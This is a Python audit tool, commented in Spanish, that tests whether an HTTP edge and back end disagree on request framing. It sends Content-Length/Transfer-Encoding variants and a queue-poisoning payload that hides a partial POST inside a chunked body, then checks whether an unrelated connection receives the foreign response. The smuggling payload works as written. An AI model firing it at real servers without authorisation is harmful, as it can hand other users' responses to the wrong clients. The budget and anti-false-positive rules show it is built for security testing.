#!/usr/bin/env python3
"""CONNECTION-STATE AUDIT (v0.77.0): ¿deja una peticion ambigua
un estado observable que modifica la interpretacion de una
peticion posterior sobre la misma conexion?

Arquitectura: A -> B sobre UNA conexion.
  baseline:    K corridas de A0 (GET limpio) -> B (GET limpio)
  tratamiento: A1 (framing aceptado / veneno) -> B identico
  comparacion: B0 == B1 ? sobre huella, conteo, cierre, latencia

REGLA (anti falso positivo): "la respuesta cambio" NO es
smuggling. Primero se demuestra QUE cambio y DONDE:
  - B recibio SU respuesta (identidad preservada)
  - B recibio una respuesta AJENA (marcador: contaminacion
    cruzada demostrable)
  - B no recibio nada (traga)
  - hay una respuesta extra con B bien atendido (pipelining
    legítimo cuando el edge honra TE: RFC 7230, no hallazgo)

Estado de la conexion como evidencia (STATE-CONTINUITY):
parser_state (respondio A? cuantas respuestas?), reuse,
request/response counter, connection_close, cache_context,
origin_context (ECO). Lo no observable queda unknown.

Clasificacion por tratamiento:
  REJECTED            A1 recibio 400/cierre
  STATE-STABLE        B atendido con huella dentro del baseline
  STATE-STABLE+PIPE   idem + respuesta extra (edge honro TE:
                      pipelining correcto, se anota, no escala)
  STATE-CHANGED       B desatendido o con huella fuera de la
                      varianza baseline
  BASELINE-AMBIGUO    el baseline varia solo (sin poder
                      discriminatorio: nada se concluye)

Escalera STATE-CHANGED: ¿reproducible? no -> UNKNOWN;
si -> SOSPECHA; y si ademas B recibio respuesta AJENA
(marcador) reproducible -> DEMO (contaminacion cruzada
demostrada: la respuesta que llego a B pertenece a otro
request).

Presupuesto: perfil v0.75 (11) + baseline K=3 (6) + T1 por
variante aceptada (2 c/u) + T2 veneno (2) + repro (2). Tope
28, secuencial, lectura A->B, marcador = path inexistente
unico por corrida.
"""
import argparse
import hashlib
import json
import random
import re
import time
import os as _os
import sys as _sys

_sys.path.insert(0, _os.path.dirname(_os.path.dirname(
    _os.path.abspath(__file__))))

from core.edge_profile import (_connect, _read_all, _statuses,
                               _headers_of, profile,
                               STATUS_RECHAZO)

MAX_REQS = 32
COOLDOWN = 0.4
K_BASELINE = 3
BODY_DIFF = b"5\r\nhello\r\n0\r\n\r\n"   # ambas lecturas consumen todo


def _blocks(raw):
    idxs = [m.start() for m in
            re.finditer(rb"HTTP/1\.1 \d{3}", raw)]
    return [raw[i:j] for i, j in
            zip(idxs, idxs[1:] + [len(raw)])]


def _huella(blk):
    """Firma observable de un bloque de respuesta."""
    if not blk.strip():
        return None
    st = _statuses(blk)
    h = _headers_of(blk)
    parts = blk.split(b"\r\n\r\n", 1)
    body = parts[1] if len(parts) == 2 else b""
    return {"status": st[0] if st else "?",
            "content_length": h.get("content-length", "?"),
            "body_sha": hashlib.sha1(body).hexdigest()[:12],
            "cache": (h.get("age") or h.get("x-cache")
                      or h.get("cf-cache-status") or "-"),
            "etag": h.get("etag", "-")}


def _similar(a, b):
    if not a or not b:
        return False
    return (a["status"] == b["status"]
            and a["content_length"] == b["content_length"]
            and a["body_sha"] == b["body_sha"])


def _get(host, path="/"):
    return (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n\r\n"
            ).encode()


def _run_AB(url, timeout, a_bytes, host, b_path="/"):
    """Una corrida A -> B sobre una conexion. Devuelve evidencia
    de STATE-CONTINUITY."""
    ev = {"n_resp": 0, "a_status": None, "huella_B": None,
          "huella_A": None, "latencia_ms": None, "marker": False,
          "cerrada_tras_A": False}
    s, _ = _connect(url, timeout)
    try:
        t0 = time.time()
        s.sendall(a_bytes)
        a_raw = _read_all(s, quiet=0.8)
        t_a = time.time() - t0
        st = _statuses(a_raw)
        ev["a_status"] = st[0] if st else None
        ev["cerrada_tras_A"] = bool(a_raw) and st == []
        s.sendall(_get(host, b_path))
        b_raw = _read_all(s, quiet=1.2)
        ev["latencia_ms"] = int((time.time() - t0 - t_a) * 1000)
    finally:
        s.close()
    full = a_raw + b_raw
    blocks = _blocks(full)
    ev["n_resp"] = len(blocks)
    if blocks:
        ev["huella_A"] = _huella(blocks[0])
        ev["huella_B"] = _huella(blocks[-1])
    return ev, full


def _framing(variant, body, host):
    te = {"cl_te": b"Transfer-Encoding: chunked\r\n",
          "te_doble": b"Transfer-Encoding: chunked\r\n"
                      b"Transfer-Encoding: chunked\r\n",
          "te_case": b"tRansfer-EnCoDiNg: ChUnKeD\r\n",
          "te_espacio": b"Transfer-Encoding : chunked\r\n"}[variant]
    cl = len(body)
    return (b"POST / HTTP/1.1\r\n"
            b"Host: " + host.encode() + b"\r\n"
            b"Content-Length: " + str(cl).encode() + b"\r\n"
            + te +
            b"Content-Type: text/plain\r\n\r\n" + body)


def audit(cfg):
    url = cfg["url"]
    timeout = float(cfg.get("timeout", 10.0))
    informe = {"target": url}
    reqs = 0

    # ---- fase 1: contrato (v0.75)
    ficha = profile({"url": url, "timeout": timeout})
    reqs += ficha.get("requests", 11)
    informe["edge_profile_resumen"] = {
        v: ficha.get(v) for v in
        ["cl_te", "te_doble", "te_espacio", "te_case", "reuse"]}
    variantes = ["cl_te", "te_doble", "te_espacio", "te_case"]
    aceptadas = [v for v in variantes
                 if ficha.get(v) == "accepted"]
    informe["aceptadas"] = aceptadas

    # host para construir requests
    s_tmp, host = _connect(url, timeout)
    s_tmp.close()

    # ---- fase 2: baseline con varianza (A0 -> B0 x K)
    baseline = []
    for _ in range(K_BASELINE):
        if reqs >= MAX_REQS:
            break
        ev, _ = _run_AB(url, timeout, _get(host), host)
        reqs += 2
        baseline.append(ev)
        time.sleep(COOLDOWN)
    huellas_b = [e["huella_B"] for e in baseline]
    distinta = set(json.dumps(h, sort_keys=True)
                   for h in huellas_b if h)
    n_resp_base = {e["n_resp"] for e in baseline}
    informe["baseline"] = {
        "corridas": len(baseline),
        "huellas_B": len(distinta),
        "n_resp": sorted(n_resp_base)}
    base_ok = len(baseline) >= 2 and len(distinta) == 1
    base_huella = huellas_b[0] if base_ok else None

    def clasifica(ev, marker_en_full, full):
        """Clasifica UNA corrida de tratamiento."""
        if (ev["a_status"] in STATUS_RECHAZO
                or ev["n_resp"] == 0):
            return "REJECTED"
        if not base_ok:
            return "BASELINE-AMBIGUO"
        b_ok = _similar(ev["huella_B"], base_huella)
        extra = ev["n_resp"] > max(n_resp_base)
        menos = ev["n_resp"] < min(n_resp_base)
        if b_ok and not extra and not menos:
            return "STATE-STABLE"
        if b_ok and extra:
            # B atendido + respuesta extra: o pipelining legitimo
            # (edge honro TE) o eco del marcador en camino
            if marker_en_full:
                return "STATE-STABLE+PIPE"
            return "STATE-STABLE+PIPE"
        if menos:
            return "STATE-CHANGED"     # B quedo sin respuesta
        # B con huella fuera del baseline
        if marker_en_full:
            return "STATE-CHANGED"     # respuesta ajena a B
        return "STATE-CHANGED"

    resultados = {}

    # ---- fase 3a: T1 benigno (framing aceptado + cuerpo DIFF)
    for v in aceptadas:
        if reqs >= MAX_REQS:
            informe["presupuesto"] = "agotado"
            break
        ev, full = _run_AB(url, timeout,
                           _framing(v, BODY_DIFF, host), host)
        reqs += 2
        veredicto = clasifica(ev, False, full)
        resultados[f"T1:{v}"] = {
            "veredicto": veredicto,
            "evidencia": _ev_publico(ev)}
        time.sleep(COOLDOWN)

    # ---- fase 3b: T2 veneno (solo si cl_te aceptado)
    # A1 = CL.TE con prefijo de request SIN terminar: el edge que
    # honre CL lo ve como cuerpo; el que honre TE lo ve como
    # proximo request (pipelining legitimo). El back desincronizado
    # lo pega a B y B recibe la respuesta AJENA al marcador.
    marker = f"/x-state-sonde-{random.randint(10**9, 10**10)}"
    informe["marker"] = marker
    if "cl_te" in aceptadas:
        # T2: VENENO QUEUE-POISONING. Prefijo = POST incompleto
        # con Content-Length EXACTO = B1 + GET-inocuo (self-cleaning:
        # no deja basura en el buffer tras la corrida).
        #   front honra TE (correcto): B1 queda como cuerpo del
        #     POST del propio cliente; conexion 2 limpia.
        #   front honra CL y back TE (desacuerdo): B1 es tragado,
        #     y el GET inocuo de la OTRA conexion completa el
        #     cuerpo y recibe la respuesta del POST ajeno:
        #     contaminacion cross-connection demostrable.
        def _t2_veneno():
            b1 = _get(host)
            cl2 = 2 * len(b1)
            prefix = (f"POST {marker} HTTP/1.1\r\n"
                      f"Host: {host}\r\n"
                      f"Content-Length: {cl2}\r\n\r\n").encode()
            body = b"0\r\n\r\n" + prefix
            ev, full = _run_AB(url, timeout,
                               _framing("cl_te", body, host), host)
            # control cross-connection: GET inocuo en conexion nueva
            s2, _ = _connect(url, timeout)
            try:
                s2.sendall(_get(host))
                raw2 = _read_all(s2, quiet=1.5)
            finally:
                s2.close()
            conn2_marker = marker.encode() in raw2
            conn2_silencio = not raw2.strip()
            return ev, full, raw2, conn2_marker, conn2_silencio

        reqs += 2
        ev, full, raw2, conn2_marker, conn2_silencio = _t2_veneno()
        reqs += 1
        b1_tragado = (ev["n_resp"] < min(n_resp_base))
        desplazo = marker.encode() in full or b1_tragado
        resultados["T2:veneno"] = {
            "veredicto": None,
            "marker_presente": marker.encode() in full,
            "b1_tragado": b1_tragado,
            "conn2_marker": conn2_marker,
            "conn2_silencio": conn2_silencio,
            "evidencia": _ev_publico(ev)}
        r2 = resultados["T2:veneno"]
        if not desplazo:
            r2["veredicto"] = "STATE-STABLE"
            r2["escalera"] = "el veneno no dejo estado observable"
        elif conn2_marker:
            # la conexion inocua recibio respuesta AJENA al POST
            # del veneno: desacuerdo de cadena cross-connection
            r2["veredicto"] = "STATE-CHANGED"
        elif conn2_silencio and b1_tragado:
            r2["veredicto"] = "STATE-CHANGED"
        else:
            # B1 absorbido pero conexion 2 limpia: pipelining a
            # nivel front (edge honro TE, RFC 7230): BENIGNO
            r2["veredicto"] = "STATE-STABLE+PIPE"
            r2["escalera"] = ("B absorbido por pipelining del "
                              "front; sin impacto cross-conn")
        time.sleep(COOLDOWN)

        # ---- fase 4: escalera solo para STATE-CHANGED
        if r2["veredicto"] == "STATE-CHANGED":
            if reqs + 3 > MAX_REQS:
                r2["escalera"] = "presupuesto"
            else:
                (ev2, full2, raw22, cm2,
                 cs2) = _t2_veneno()
                reqs += 3
                repro = (cm2 or (cs2 and ev2["n_resp"]
                                 < min(n_resp_base)))
                if repro and cm2:
                    r2["veredicto"] = "DEMO"
                    r2["escalera"] = ("reproducible + respuesta "
                                      "ajena entregada a una "
                                      "conexion inocente: "
                                      "contaminacion cruzada "
                                      "demostrada")
                elif repro:
                    r2["veredicto"] = "SOSPECHA"
                    r2["escalera"] = ("reproducible, sin respuesta "
                                      "ajena observable")
                else:
                    r2["veredicto"] = "UNKNOWN"
                    r2["escalera"] = "no reproducible"
                time.sleep(COOLDOWN)

    informe["resultados"] = resultados
    informe["requests"] = reqs
    informe["max_requests"] = MAX_REQS

    veredictos = [r["veredicto"] for r in resultados.values()]
    if "DEMO" in veredictos:
        informe["veredicto"] = "DEMO"
    elif "SOSPECHA" in veredictos:
        informe["veredicto"] = "SOSPECHA"
    elif veredictos and all(
            v.startswith("STATE-STABLE")
            or v == "REJECTED" for v in veredictos):
        informe["veredicto"] = "STATE-STABLE"
    elif not resultados:
        informe["veredicto"] = "SIN-TRATAMIENTO"
    else:
        informe["veredicto"] = "MIXTO"
    return informe


def _ev_publico(ev):
    return {"n_resp": ev["n_resp"],
            "a_status": ev["a_status"],
            "huella_B": ev["huella_B"],
            "latencia_ms": ev["latencia_ms"]}


def _render(informe):
    out = [f"CONNECTION-STATE AUDIT: {informe.get('target', '?')}",
           "-" * 48,
           f"veredicto: {informe.get('veredicto', '?')}"]
    b = informe.get("baseline", {})
    if b:
        out.append(f"baseline: {b['corridas']} corridas, "
                   f"{b['huellas_B']} huella(s) B, "
                   f"n_resp={b['n_resp']}")
    out.append("")
    for tag, r in informe.get("resultados", {}).items():
        ev = r.get("evidencia", {})
        out.append(f"{tag:16} {r['veredicto']}"
                   + (f"  (marker={r['marker_presente']})"
                      if "marker_presente" in r else ""))
        out.append(f"{'':16} n_resp={ev.get('n_resp')} "
                   f"a={ev.get('a_status')} "
                   f"B_sha={_sha_corto(ev)}")
        if "escalera" in r:
            out.append(f"{'':16} escalera: {r['escalera']}")
    out.append("")
    out.append(f"requests: {informe.get('requests', '?')}/"
               f"{informe.get('max_requests', '?')}")
    out.append("regla: 'cambio la respuesta' no es smuggling;")
    out.append("se demuestra que cambio y donde antes de escalar.")
    return "\n".join(out)


def _sha_corto(ev):
    h = ev.get("huella_B") or {}
    return h.get("body_sha", "?")[:6]


def main():
    ap = argparse.ArgumentParser(
        description="CONNECTION-STATE AUDIT: ¿deja A un estado "
                    "que modifica la interpretacion de B?")
    ap.add_argument("url")
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--json", action="store_true")
    a = ap.parse_args()
    informe = audit({"url": a.url, "timeout": a.timeout})
    if a.json:
        print(json.dumps(informe, indent=2, default=str))
    else:
        print(_render(informe))


if __name__ == "__main__":
    main()
